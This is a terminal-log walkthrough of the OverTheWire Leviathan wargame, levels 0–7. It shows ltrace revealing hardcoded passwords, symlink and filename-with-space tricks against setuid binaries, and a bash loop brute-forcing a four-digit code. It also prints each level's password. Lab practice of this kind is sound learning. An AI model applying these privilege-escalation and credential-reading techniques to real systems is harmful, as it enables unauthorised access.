Level 0 --> Level 1

$ ssh leviathan0@leviathan.labs.overthewire.org -p 2223
// password: leviathan0
leviathan0@leviathan:~$ ls -a
.  ..  .backup  .bash_logout  .bashrc  .profile
leviathan0@leviathan:~$ cd .backup/
leviathan0@leviathan:~/.backup$ ls
bookmarks.html
leviathan0@leviathan:~/.backup$ cat bookmarks.html | grep leviathan0
leviathan0@leviathan:~/.backup$ cat bookmarks.html | grep leviathan
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
// => password for leviathan1 is rioGegei8m

Level 1 --> Level 2

$ ssh leviathan1@leviathan.labs.overthewire.org -p 2223
// password: rioGegei8m
leviathan1@leviathan:~$ ls
check
leviathan1@leviathan:~$ file check 
check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c735f6f3a3a94adcad8407cc0fda40496fd765dd, not stripped
leviathan1@leviathan:~$ ./check 
password: rioGegei8m
Wrong password, Good Bye ...
leviathan1@leviathan:~$ ltrace ./check 
__libc_start_main(0x804853b, 1, 0xffffd6d4, 0x8048610 <unfinished ...>
printf("password: ")                             = 10
getchar(1, 0, 0x65766f6c, 0x646f6700password: rioGegei8m
)            = 114
getchar(1, 0, 0x65766f6c, 0x646f6700)            = 105
getchar(1, 0, 0x65766f6c, 0x646f6700)            = 111
strcmp("rio", "sex")                             = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)             = 29
+++ exited (status 0) +++
leviathan1@leviathan:~$ ltrace ./check 
__libc_start_main(0x804853b, 1, 0xffffd6d4, 0x8048610 <unfinished ...>
printf("password: ")                             = 10
getchar(1, 0, 0x65766f6c, 0x646f6700password: cuong
)            = 99
getchar(1, 0, 0x65766f6c, 0x646f6700)            = 117
getchar(1, 0, 0x65766f6c, 0x646f6700)            = 111
strcmp("cuo", "sex")                             = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)             = 29
+++ exited (status 0) +++
leviathan1@leviathan:~$ ltrace ./check 
__libc_start_main(0x804853b, 1, 0xffffd6d4, 0x8048610 <unfinished ...>
printf("password: ")                             = 10
getchar(1, 0, 0x65766f6c, 0x646f6700password: sex
)            = 115
getchar(1, 0, 0x65766f6c, 0x646f6700)            = 101
getchar(1, 0, 0x65766f6c, 0x646f6700)            = 120
strcmp("sex", "sex")                             = 0
geteuid()                                        = 12001
geteuid()                                        = 12001
setreuid(12001, 12001)                           = 0
system("/bin/sh"$ whoami
leviathan1
$ bash   		
leviathan1@leviathan:~$ cat /etc/leviathan_pass/leviathan2
cat: /etc/leviathan_pass/leviathan2: Permission denied
leviathan1@leviathan:~$ exit
$ 
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 256
+++ exited (status 0) +++
leviathan1@leviathan:~$ ./check sex
password: sex
$ whiami
/bin/sh: 1: whiami: not found
$ whoami
leviathan2
$ bash
leviathan2@leviathan:~$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
// => password for leviathan2 is ougahZi8Ta

Level 2 --> Level 3

$ ssh leviathan2@leviathan.labs.overthewire.org -p 2223
// password: ougahZi8Ta
leviathan2@leviathan:~$ ls -a
.  ..  .bash_logout  .bashrc  printfile  .profile
leviathan2@leviathan:~$ file printfile 
printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=46891a094764828605a00c0c38abfccbe4b46548, not stripped
leviathan2@leviathan:~$ ./printfile 
*** File Printer ***
Usage: ./printfile filename
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan2
/bin/cat: /etc/leviathan_pass/leviathan2: Permission denied
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
leviathan2@leviathan:~$ echo "some test at leviathan2" >> /tmp/cuongbv/test.txt
leviathan2@leviathan:~$ cd /tmp/cuongbv
leviathan2@leviathan:/tmp/cuongbv$ ls
pass file.txt  test.txt
leviathan2@leviathan:/tmp/cuongbv$ cd -
/home/leviathan2
leviathan2@leviathan:~$ rm -rf /tmp/cuongbv
leviathan2@leviathan:~$ cd -
-bash: cd: /tmp/cuongbv: No such file or directory
leviathan2@leviathan:~$ echo "some test at leviathan2" >> /tmp/cuongbv/test.txt
-bash: /tmp/cuongbv/test.txt: No such file or directory
leviathan2@leviathan:~$ mkdir /tmp/cuongbv
leviathan2@leviathan:~$ echo "some test at leviathan2" >> /tmp/cuongbv/test.txt
leviathan2@leviathan:~$ cd /tmp/cuongbv
leviathan2@leviathan:/tmp/cuongbv$ ls
test.txt
leviathan2@leviathan:/tmp/cuongbv$ cd ;
leviathan2@leviathan:~$ ./printfile /tmp/cuongbv/test.txt 
some test at leviathan2
leviathan2@leviathan:~$ ltrace ./printfile /tmp/cuongbv/test.txt 
__libc_start_main(0x804852b, 2, 0xffffd694, 0x8048610 <unfinished ...>
access("/tmp/cuongbv/test.txt", 4)               = 0
snprintf("/bin/cat /tmp/cuongbv/test.txt", 511, "/bin/cat %s", "/tmp/cuongbv/test.txt") = 30
geteuid()                                        = 12002
geteuid()                                        = 12002
setreuid(12002, 12002)                           = 0
system("/bin/cat /tmp/cuongbv/test.txt"some test at leviathan2
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 0
+++ exited (status 0) +++
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan2
__libc_start_main(0x804852b, 2, 0xffffd694, 0x8048610 <unfinished ...>
access("/etc/leviathan_pass/leviathan2", 4)      = 0
snprintf("/bin/cat /etc/leviathan_pass/lev"..., 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2") = 39
geteuid()                                        = 12002
geteuid()                                        = 12002
setreuid(12002, 12002)                           = 0
system("/bin/cat /etc/leviathan_pass/lev"...ougahZi8Ta
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 0
+++ exited (status 0) +++
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x804852b, 2, 0xffffd694, 0x8048610 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                                                                                                        = -1
puts("You cant have that file..."You cant have that file...
)                                                                                                                 = 27
+++ exited (status 1) +++
leviathan2@leviathan:~$ ls -l 
.bash_logout  .bashrc       printfile     .profile      
leviathan2@leviathan:~$ ls -l printfile 
-r-sr-x--- 1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
leviathan2@leviathan:~$ cd /tmp/cuongbv
leviathan2@leviathan:/tmp/cuongbv$ touch pass\ file.txt
leviathan2@leviathan:/tmp/cuongbv$ cd;
leviathan2@leviathan:~$ ltrace ./printfile /tmp/cuongbv/pass\ file.txt 
__libc_start_main(0x804852b, 2, 0xffffd694, 0x8048610 <unfinished ...>
access("/tmp/cuongbv/pass file.txt", 4)                                                                                                            = 0
snprintf("/bin/cat /tmp/cuongbv/pass file."..., 511, "/bin/cat %s", "/tmp/cuongbv/pass file.txt")                                                  = 35
geteuid()                                                                                                                                          = 12002
geteuid()                                                                                                                                          = 12002
setreuid(12002, 12002)                                                                                                                             = 0
system("/bin/cat /tmp/cuongbv/pass file.".../bin/cat: /tmp/cuongbv/pass: No such file or directory
/bin/cat: file.txt: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                             = 256
+++ exited (status 0) +++
leviathan2@leviathan:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/cuongbv/pass
leviathan2@leviathan:~$ cd -
/tmp/cuongbv
leviathan2@leviathan:/tmp/cuongbv$ ls -la
total 232
drwxr-sr-x   2 leviathan2 root   4096 May 21 14:18 .
drwxrws-wt 585 root       root 225280 May 21 14:18 ..
lrwxrwxrwx   1 leviathan2 root     30 May 21 14:18 pass -> /etc/leviathan_pass/leviathan3
-rw-r--r--   1 leviathan2 root      0 May 21 14:16 pass file.txt
-rw-r--r--   1 leviathan2 root     24 May 21 14:05 test.txt
leviathan2@leviathan:/tmp/cuongbv$ cd;
leviathan2@leviathan:~$ ./printfile /tmp/cuongbv/pass\ file.txt 
Ahdiemoo1j
/bin/cat: file.txt: No such file or directory
leviathan2@leviathan:~$ cd -
/tmp/cuongbv
leviathan2@leviathan:/tmp/cuongbv$ ls
pass  pass file.txt  test.txt
leviathan2@leviathan:/tmp/cuongbv$ mv test.txt file.txt
leviathan2@leviathan:/tmp/cuongbv$ ls
file.txt  pass  pass file.txt
leviathan2@leviathan:/tmp/cuongbv$ cd -
/home/leviathan2
leviathan2@leviathan:~$ ./printfile /tmp/cuongbv/pass\ file.txt 
Ahdiemoo1j
/bin/cat: file.txt: No such file or directory
leviathan2@leviathan:~$ cd -
/tmp/cuongbv
leviathan2@leviathan:/tmp/cuongbv$ ~/printfile pass
pass           pass file.txt  
leviathan2@leviathan:/tmp/cuongbv$ ~/printfile pass\ file.txt 
Ahdiemoo1j
some test at leviathan2
// => password for leviathan3 is Ahdiemoo1j

Level 3 --> Level 4

$ ssh leviathan3@leviathan.labs.overthewire.org -p 2223
// password: Ahdiemoo1j
leviathan3@leviathan:~$ ls -a
.  ..  .bash_logout  .bashrc  level3  .profile
leviathan3@leviathan:~$ ./level3 
Enter the password> Ahdiemoo1j
bzzzzzzzzap. WRONG
leviathan3@leviathan:~$ ltrace ./level3 
__libc_start_main(0x8048618, 1, 0xffffd6c4, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka")                       = -1
printf("Enter the password> ")                   = 20
fgets(Enter the password> Ahdiemoo1j
"Ahdiemoo1j\n", 256, 0xf7fc55a0)           = 0xffffd4d0
strcmp("Ahdiemoo1j\n", "snlprintf\n")            = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                       = 19
+++ exited (status 0) +++
leviathan3@leviathan:~$ ./level3 snlprintf
Enter the password> snlprintf  
[You've got shell]!
$ bash
leviathan4@leviathan:~$ whoami
leviathan4
leviathan4@leviathan:~$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
// => password for leviathan4 is vuH0coox6m

Level 4 --> Level 5

$ ssh leviathan4@leviathan.labs.overthewire.org -p 2223
// password is vuH0coox6m
leviathan4@leviathan:~$ ls -a
.  ..  .bash_logout  .bashrc  .profile  .trash
leviathan4@leviathan:~$ cd .trash/
leviathan4@leviathan:~/.trash$ ls
bin
leviathan4@leviathan:~/.trash$ ./bin 
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 
// binary to ascii -- password Tith4cokei

Level 5 --> Level 6

$ ssh leviathan5@leviathan.labs.overthewire.org -p 2223
// password is Tith4cokei
leviathan5@leviathan:~$ ls -la
total 28
drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan6 leviathan5 7560 Aug 26  2019 leviathan5
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan5@leviathan:~$ ./leviathan5 
Cannot find /tmp/file.log
leviathan5@leviathan:~$ ltrace ./leviathan5 
__libc_start_main(0x80485db, 1, 0xffffd6c4, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                                                                                                                        = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                                                                                                                  = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5 
UgaoFee4li
// => password is UgaoFee4li

Level 6--> Level 7

$ ssh leviathan6@leviathan.labs.overthewire.org -p 2223
// password is UgaoFee4li
leviathan6@leviathan:~$ ls -la
total 28
drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan7 leviathan6 7452 Aug 26  2019 leviathan6
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan6@leviathan:~$ ./leviathan6 
usage: ./leviathan6 <4 digit code>
leviathan6@leviathan:~$ ./leviathan6 1235
Wrong
leviathan6@leviathan:~$ cd /tmp/cuongbv6
// create file bruteforce.sh to bruteforce attack
leviathan6@leviathan:/tmp/cuongbv6$ cat bruteforce.sh 
#!/bin/bash

for i in {0000..9999}
do
    echo $i
    ~/leviathan6 $i
done
leviathan6@leviathan:/tmp/cuongbv6$ chmod +x bruteforce.sh 
leviathan6@leviathan:/tmp/cuongbv6$ ./bruteforce.sh 
...
7121
Wrong
7122
Wrong
7123
$ bash
leviathan7@leviathan:/tmp/cuongbv6$ whoami
leviathan7
leviathan7@leviathan:/tmp/cuongbv6$ cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9
// => password is ahy7MaeBo9

Level 7 --> Level 8

$ ssh leviathan7@leviathan.labs.overthewire.org -p 2223
// => password is ahy7MaeBo9
leviathan7@leviathan:~$ ls -la
total 24
drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r--r-----  1 leviathan7 leviathan7  178 Aug 26  2019 CONGRATULATIONS
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan7@leviathan:~$ cat CONGRATULATIONS 
Well Done, you seem to have used a *nix system before, now try something more serious.
(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)


